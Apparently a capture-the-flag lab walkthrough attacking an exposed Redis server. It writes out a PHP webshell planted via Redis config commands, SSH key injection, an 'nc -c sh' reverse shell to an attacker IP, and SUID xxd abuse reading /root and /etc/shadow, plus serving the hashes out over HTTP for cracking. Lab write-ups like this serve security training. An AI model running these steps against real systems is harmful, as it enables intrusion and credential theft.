6379 (Redis 6.0.7)
tried some metasploit modules, didn’t work right
nc 10.10.143.42 6379
got a REDIS prompt?
found article on pentesting redis 
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
config set dir /var/www/html
config set dbfilename redis.php
set test “<?php phpinfo(); ?>”
works we have RCE
set test "<?php system($_GET['cmd']);?>"

webshell
SSH
Decided to follow the pentest guide and add ssh keys to the box via redis
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.10.13.15 -x set ssh_key
didn’t work, ssh is closed dummy
Webshell
tried inputting many revshells, eventually this worked
nc -c sh 10.6.15.130 4444
Reverse Shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Priv Esc
found that xxd has SUID bit set
can be used for file reads?
xxd “/root/root.txt” | xxd -r
thm{xxd_pr1v_escalat1on}
Vianka Password
I am also supposed to get vianka user password
used xxd vuln to put /etc/shadow and password into /tmp/password shadow
cd /tmp; python -m SimpleHTTPServer
Downloaded to kali
unshadow password.txt shadow.txt > unshadowed.txt
